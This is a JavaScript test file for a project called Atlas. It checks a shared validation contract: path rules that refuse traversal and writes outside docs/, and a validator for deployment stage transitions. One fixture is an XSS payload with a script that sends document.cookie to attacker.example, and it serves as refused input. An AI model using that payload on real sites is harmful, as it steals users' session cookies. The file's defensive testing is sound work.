// The pieces of Atlas's contract that the managed Function and the generator must agree on,
// letter for letter — and the proof that they are one definition rather than two that look alike.
//
// `api/lib/contract.mjs` is the single home. It lives inside the Function's own directory because
// that directory is what Static Web Apps ships: an `api_location` is packaged on its own, so a
// module the Function imports from outside it would not survive the deploy. The generator imports
// it back out through `src/schema.mjs`, which is where a reader of this repository looks for a
// closed vocabulary.

import test from 'node:test';
import assert from 'node:assert/strict';

import {
  ACCEPTANCE_RESULTS,
  DEPLOYMENT_STAGES,
  whyNotADirectoryName,
  whyNotAWritableRecord,
} from '../api/lib/contract.mjs';
import { validateDeploymentTransitionPayload } from '../api/lib/payload.mjs';
import * as schema from '../src/schema.mjs';

test('contract: the acceptance vocabulary is closed, frozen and exactly pass/fail', () => {
  assert.deepEqual([...ACCEPTANCE_RESULTS], ['pass', 'fail']);
  assert.ok(Object.isFrozen(ACCEPTANCE_RESULTS), 'the vocabulary can be edited at runtime');
});

test('contract: src/schema.mjs re-exports the SAME acceptance vocabulary, not a copy of it', () => {
  // Identity, not equality. Two arrays with equal contents are exactly the drift this test exists
  // to forbid: they pass a deepEqual on the day they are written and diverge silently after.
  assert.equal(schema.ACCEPTANCE_RESULTS, ACCEPTANCE_RESULTS);
});

test('contract: the generator validates workstream slugs with the SAME function the Function does', () => {
  assert.equal(schema.whyNotADirectoryName, whyNotADirectoryName);
});

test('contract: the slug rule refuses every spelling that could escape docs/features/', () => {
  // Each of these is a path the write endpoints must never reach. The rule is the one boundary
  // stopping a workstream name from becoming a path.
  const escapes = ['.', '..', 'a/b', 'a\\b', '../outside', './beacon', '.hidden', ' beacon', 'beacon '];
  for (const bad of escapes) {
    assert.notEqual(
      whyNotADirectoryName(bad),
      '',
      `${JSON.stringify(bad)} was accepted as a directory name`,
    );
  }
  const withControlChar = `bea${String.fromCharCode(1)}con`;
  assert.notEqual(whyNotADirectoryName(withControlChar), '', 'a control character was accepted');

  assert.equal(whyNotADirectoryName('beacon'), '', 'an ordinary slug was refused');
  assert.equal(whyNotADirectoryName('tide-2'), '', 'an ordinary slug was refused');
});

test('contract: a config carrying a path-shaped workstream still fails validation by that rule', () => {
  const result = schema.validateConfig({ project: 'P', repo: 'o/n', workstreams: ['../outside'] });
  assert.equal(result.ok, false);
  assert.match(result.errors[0].message, /decision 40/);
});

// --- what may be written to, tested directly ------------------------------------------------------
//
// Added after a re-review: the rule was only ever exercised THROUGH the handler, whose table of
// cases used clean paths, so a gap between what it validated and what the handler then used
// survived a whole round. A rule that decides where Atlas may write is worth its own tests.

test('record rule: an ordinary record under docs/ is writable', () => {
  for (const good of [
    'docs/x.md',
    'docs/features/a-stream/m1-demo.md',
    'docs/acceptance/2026/m1.md',
    'docs/a-file-with-no-extension',
  ]) {
    assert.equal(whyNotAWritableRecord(good), '', `${JSON.stringify(good)} was refused`);
  }
});

test('record rule: nothing outside docs/ is writable, whatever it is', () => {
  for (const bad of [
    '.github/workflows/deploy.yml',
    'action.yml',
    'src/build.mjs',
    'package.json',
    'atlas.config.json',
    'ROADMAP.md',
    'api/lib/handlers.mjs',
    'docs',
    '',
    '/etc/passwd',
    '/docs/x.md',
    'docs/../.github/x.yml',
    'docs/./x.md',
    'docs\\x.md',
    'docs/',
    'docs//x.md',
  ]) {
    assert.notEqual(whyNotAWritableRecord(bad), '', `${JSON.stringify(bad)} was accepted`);
  }
});

test('record rule: a manifest is not writable, even though it is under docs/', () => {
  assert.notEqual(whyNotAWritableRecord('docs/features/a/workstream.json'), '');
  // Case-insensitively: the spellings are one file on a case-insensitive checkout, and the rule
  // exists to keep manifests out of Atlas rather than to keep one spelling of them out.
  assert.notEqual(whyNotAWritableRecord('docs/features/a/WORKSTREAM.JSON'), '');
  assert.notEqual(whyNotAWritableRecord('docs/features/a/Workstream.Json'), '');
});

test('record rule: a path that is not already trimmed is refused, not silently trimmed', () => {
  // The gap a re-review found. The rule validated `repositoryRelative.trim()` while the handler
  // went on to use the ORIGINAL string, so `" docs/x.md"` validated as `docs/…` and was then
  // requested as `%20docs/x.md`. The stated invariant — Atlas writes under docs/ and nowhere else
  // — was false as implemented: the first segment could be `" docs"`.
  //
  // Trimming here and returning a canonical value would leave the same trap for the next caller
  // who forgot to use it. Refusing means the string that was validated and the string that gets
  // used cannot differ, because there is only one of them.
  const untrimmed = [
    ' docs/x.md',
    'docs/x.md ',
    '\ndocs/x.md',
    '\tdocs/x.md',
    'docs/x.md\n',
    ' docs/x.md',
    '﻿docs/x.md',
    '  docs/x.md  ',
  ];
  for (const record of untrimmed) {
    const why = whyNotAWritableRecord(record);
    assert.notEqual(why, '', `${JSON.stringify(record)} was accepted`);
    assert.match(why, /whitespace/i, `${JSON.stringify(record)}: ${why}`);
  }
});

test('record rule: whitespace INSIDE a path is fine — records may have spaces in their names', () => {
  // The fixture ships `docs/field notes.html`, so this is not hypothetical.
  assert.equal(whyNotAWritableRecord('docs/field notes.md'), '');
});

// --- validateDeploymentTransitionPayload -----------------------------------------------------------
//
// Modeled on `validateAcceptancePayload` (api/lib/payload.mjs:140), field for field, with one
// deliberate omission: a deployment transition is feature-level — a workstream moving to a new
// stage — not milestone-level, so there is no `milestone` field and no `MILESTONE_ID` check here.

// Verbatim from writeback-handlers.test.mjs's own XSS fixture, reused rather than re-typed so the
// two suites are provably testing the same refused input, not two strings that merely look alike.
const XSS =
  '<img src=x onerror="alert(1)"><script>fetch("https://attacker.example/"+document.cookie)</script>';

test('deployment transition: a valid payload with no note validates', () => {
  const result = validateDeploymentTransitionPayload({
    workstream: 'a-stream',
    stage: 'staging',
    sha: 'a'.repeat(40),
  });
  assert.equal(result.ok, true);
  assert.deepEqual(result.value, {
    workstream: 'a-stream',
    stage: 'staging',
    note: null,
    sha: 'a'.repeat(40),
  });
});

test('deployment transition: a valid payload with a note validates', () => {
  const result = validateDeploymentTransitionPayload({
    workstream: 'a-stream',
    stage: 'release',
    note: 'Promoted after the M8 acceptance run passed.',
    sha: 'a'.repeat(40),
  });
  assert.equal(result.ok, true);
  assert.equal(result.value.note, 'Promoted after the M8 acceptance run passed.');
});

test('deployment transition: a missing workstream is refused by name', () => {
  const result = validateDeploymentTransitionPayload({ stage: 'staging' });
  assert.equal(result.ok, false);
  assert.match(result.message, /"workstream" is required/);
});

test('deployment transition: a stage outside the closed vocabulary is refused by name', () => {
  // `shipping` is not a DEPLOYMENT_STAGES value, and it is not a WORKSTREAM_STAGES value either —
  // the single catch-all stage WORKSTREAM_STAGES replaced. It exists here as the "not a real stage
  // at all" case, distinct from `designing` below.
  const result = validateDeploymentTransitionPayload({
    workstream: 'atlas',
    stage: 'shipping',
    sha: 'a'.repeat(40),
  });
  assert.equal(result.ok, false);
  assert.match(result.message, /must be one of: development, staging, release/);
  assert.match(result.message, /"shipping"/);
});

test('a stage transition to a pre-development value is refused by name', () => {
  const result = validateDeploymentTransitionPayload({
    workstream: 'atlas', stage: 'designing', sha: 'abc',
  });
  assert.equal(result.ok, false);
  assert.match(result.message, /must be one of: development, staging, release/);
});

test('deployment transition: an unwritable note is refused the same way the acceptance note is', () => {
  const result = validateDeploymentTransitionPayload({
    workstream: 'a-stream',
    stage: 'staging',
    note: XSS,
    sha: 'a'.repeat(40),
  });
  assert.equal(result.ok, false);
  assert.match(result.message, /HTML/i);
});

test('deployment transition: a missing sha is fine — sha is optional, as it is for acceptance', () => {
  const result = validateDeploymentTransitionPayload({
    workstream: 'a-stream',
    stage: 'staging',
  });
  assert.equal(result.ok, true);
  assert.equal(result.value.sha, null);
});
